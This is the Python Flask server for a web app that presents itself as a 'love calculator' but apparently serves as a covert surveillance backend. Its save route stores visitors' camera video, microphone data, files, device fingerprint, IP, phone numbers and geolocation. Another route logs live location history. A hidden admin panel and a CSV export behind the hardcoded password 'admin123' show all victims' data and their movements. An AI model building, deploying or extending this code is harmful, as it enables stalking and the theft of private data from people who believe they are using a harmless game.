from flask import Flask, request, jsonify, render_template_string, Response, send_from_directory
from supabase import create_client, Client
import os
import random
import sys
from datetime import datetime

app = Flask(__name__, static_folder='static')

# ---------- Safe Supabase Setup ----------
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")

if not SUPABASE_URL or not SUPABASE_KEY:
    print("⚠️ Missing Supabase credentials. App will run without database.", file=sys.stderr)
    supabase = None
else:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

SERVICE_ID = "srv-d7jkpe3bc2fs73c2qiu0"

# ---------- Helper Functions (unchanged) ----------
def save_visitor(data):
    if supabase is None:
        return
    existing = supabase.table("visitors").select("id").eq("sessionId", data.get("sessionId")).execute()
    if existing.data:
        supabase.table("visitors").update(data).eq("sessionId", data.get("sessionId")).execute()
    else:
        supabase.table("visitors").insert(data).execute()

def save_location_update(session_id, lat, lon):
    if supabase is None:
        return
    supabase.table("location_history").insert({
        "sessionId": session_id,
        "timestamp": datetime.now().isoformat(),
        "latitude": lat,
        "longitude": lon
    }).execute()

def get_location_history(session_id):
    if supabase is None:
        return []
    res = supabase.table("location_history").select("timestamp,latitude,longitude").eq("sessionId", session_id).order("id").execute()
    return [(row["timestamp"], row["latitude"], row["longitude"]) for row in res.data]

def get_all_visitors():
    if supabase is None:
        return []
    res = supabase.table("visitors").select("*").order("id", desc=True).execute()
    visitors = []
    for row in res.data:
        row["location_history"] = get_location_history(row.get("sessionId"))
        visitors.append(row)
    return visitors

# ---------- Love Calculator ----------
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony. So beautiful!",
        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score. True love is near!",
        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!",
        f"💘 {name1} and {name2}, your love percentage is {percentage}%. Cherish every moment!",
        f"🎯 Love radar: {name1} → {name2} = {percentage}%. Cupid is working overtime!",
        f"💖 Every heartbeat of {name1} whispers {name2} – {percentage}% true love!",
        f"🌙 Under the moonlight, {name1} and {name2} share a {percentage}% cosmic bond.",
        f"🍀 Lucky stars align: {name1} + {name2} = {percentage}% soulmate destiny!",
        f"💌 A love letter from the universe: {percentage}% compatibility for {name1} & {name2}.",
        f"💎 {name1} and {name2}, your love is rarer than a diamond – {percentage}% pure!",
        f"🔥 The fire between {name1} and {name2} burns at {percentage}% intensity!",
        f"💞 {name1} and {name2} are {percentage}% intertwined by fate – a beautiful story.",
        f"💐 Flowers bloom when {name1} and {name2} are together – {percentage}% harmony!",
        f"🕯️ A candlelit future awaits {name1} and {name2} with {percentage}% passion.",
        f"💪 {name1} and {name2}, your love is {percentage}% strong – unbreakable!",
        f"✨ {percentage}% means the universe is conspiring to bring {name1} and {name2} closer.",
        f"💖 {name1}’s smile meets {name2}’s heart – {percentage}% match made in heaven.",
        f"💘 {name1} and {name2} are {percentage}% compatible – time to celebrate!",
        f"🎉 Congratulations {name1} & {name2}! Your love score is {percentage}% – truly special.",
        f"💝 {name1} and {name2} share a {percentage}% love frequency – so rare!",
        f"💓 {name1} and {name2}, your hearts beat at {percentage}% unison – beautiful!",
        f"💕 {percentage}% love means {name1} and {name2} are meant to be together.",
        f"🌟 The stars have decided: {name1} & {name2} = {percentage}% eternal love.",
        f"💎 {name1} and {name2}, your love is {percentage}% precious – never let go.",
        f"💞 {name1} and {name2} are {percentage}% soulmates – a perfect match!",
        f"🎈 {percentage}% love score! {name1} and {name2} are floating on cloud nine."
    ]
    return random.choice(messages)

# ---------- Flask Routes ----------
@app.route('/')
def index():
    # Serve the index.html from the static folder
    try:
        return send_from_directory('static', 'index.html')
    except Exception as e:
        return f"<h1>Error loading index.html</h1><p>{str(e)}</p><p>Make sure static/index.html exists.</p>", 500

@app.route('/get-session-data', methods=['POST'])
def get_session_data_route():
    data = request.json
    session_id = data.get('sessionId')
    if session_id and supabase:
        res = supabase.table("visitors").select("name,crush_name,fortuneText,phoneNumber").eq("sessionId", session_id).execute()
        if res.data:
            row = res.data[0]
            return jsonify({
                'exists': True,
                'name': row.get("name"),
                'crush_name': row.get("crush_name"),
                'fortuneText': row.get("fortuneText"),
                'phoneNumber': row.get("phoneNumber")
            })
    return jsonify({'exists': False})

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    data['ip'] = request.remote_addr
    data['service_id'] = SERVICE_ID
    required_fields = ['sessionId', 'name', 'crush_name', 'fingerprint', 'batteryLevel', 'batteryCharging',
                       'networkType', 'networkSpeed', 'deviceMemory', 'screen', 'timezone', 'userAgent',
                       'latitude', 'longitude', 'mapUrl', 'cameraVideo', 'microphone', 'files']
    for field in required_fields:
        if field not in data:
            data[field] = ''
    save_visitor(data)
    return jsonify({'status': 'saved'})

@app.route('/update-location', methods=['POST'])
def update_location():
    data = request.json
    session_id = data.get('sessionId')
    lat = data.get('latitude')
    lon = data.get('longitude')
    if session_id and lat is not None and lon is not None:
        save_location_update(session_id, lat, lon)
        return jsonify({'status': 'recorded'})
    return jsonify({'status': 'error'}), 400

@app.route('/save-phone', methods=['POST'])
def save_phone():
    data = request.json
    session_id = data.get('sessionId')
    phone = data.get('phoneNumber')
    fortune_text = data.get('fortune')
    if session_id and supabase:
        supabase.table("visitors").update({"phoneNumber": phone, "fortuneText": fortune_text}).eq("sessionId", session_id).execute()
        return jsonify({'status': 'saved'})
    return jsonify({'status': 'error'}), 400

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'admin123':
            visitors = get_all_visitors()
            if not visitors:
                return '<h1>💕 No data yet</h1><p><a href="/admin">Back to login</a></p>'
            columns = list(visitors[0].keys())
            if 'location_history' in columns:
                columns.remove('location_history')
            html = '<h1>💕 Visitor Data (All Fields)</h1>'
            html += '<p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
            html += '<div style="overflow-x: auto;">'
            html += '<table border="1" cellpadding="5" style="border-collapse: collapse; min-width: 800px;">'
            html += '<tr>' + ''.join(f'<th style="background:#ff6b6b; color:white; padding:8px;">{col}</th>' for col in columns) + '</tr>'
            for v in visitors:
                html += '<tr>'
                for col in columns:
                    val = v.get(col, '')
                    if col in ('cameraVideo', 'files') and isinstance(val, str) and len(val) > 100:
                        display_val = f'<div style="max-width:300px; overflow-x:auto; white-space:pre-wrap; font-size:11px;">{val}</div>'
                    else:
                        display_val = str(val)[:500]
                    html += f'<td style="padding:8px; font-size:12px;">{display_val}</td>'
                html += '</tr>'
            html += '</table></div>'

            html += '<hr><h2>📍 Live Location History (movement tracking)</h2>'
            for v in visitors:
                hist = v.get('location_history', [])
                if hist:
                    html += f'<h3>Session: {v.get("sessionId", "Unknown")} – {v.get("name", "Anonymous")} (crush: {v.get("crush_name", "?")})</h3>'
                    html += '<table border="1" cellpadding="3" style="margin-bottom:20px;">'
                    html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
                    for ts, lat, lon in hist:
                        map_link = f'https://www.google.com/maps?q={lat},{lon}'
                        html += f'<tr><td style="white-space:nowrap;">{ts}</td>




{lat}</td>




{lon}</td>




<a href="{map_link}" target="_blank">View</a></td>




'
                    html += '</table>'
            return html
        else:
            return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
    
    return '''
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title>
        <style>
            body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
            .login-box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(0,0,0,0.1); text-align: center; }
            input { padding: 10px; margin: 10px; width: 200px; border-radius: 10px; border: 1px solid #ccc; }
            button { padding: 10px 20px; background: #ff6b6b; color: white; border: none; border-radius: 10px; cursor: pointer; }
        </style>
        </head>
        <body>
            <div class="login-box">
                <h2>🔐 Admin Login</h2>
                <form method="POST">
                    <input type="password" name="password" placeholder="Enter password" required><br>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
    '''

@app.route('/admin/download-csv')
def download_csv():
    pwd = request.args.get('pass')
    if pwd != 'admin123':
        return 'Unauthorized', 403
    visitors = get_all_visitors()
    import csv
    from io import StringIO
    if not visitors:
        return "No data"
    output = StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)
    columns = [k for k in visitors[0].keys() if k != 'location_history']
    writer.writerow(columns)
    for v in visitors:
        row = [str(v.get(col, '')).replace('\n', ' ').replace('\r', ' ') for col in columns]
        writer.writerow(row)
    return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=visitors_data.csv'})

@app.route('/calculate-love', methods=['POST'])
def calculate_love():
    data = request.json
    name1 = data.get('name1', '')
    name2 = data.get('name2', '')
    if not name1 or not name2:
        return jsonify({'message': 'Please provide both names'}), 400
    percentage = calculate_love_percentage(name1, name2)
    message = get_love_message(name1, name2, percentage)
    return jsonify({'percentage': percentage, 'message': message})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
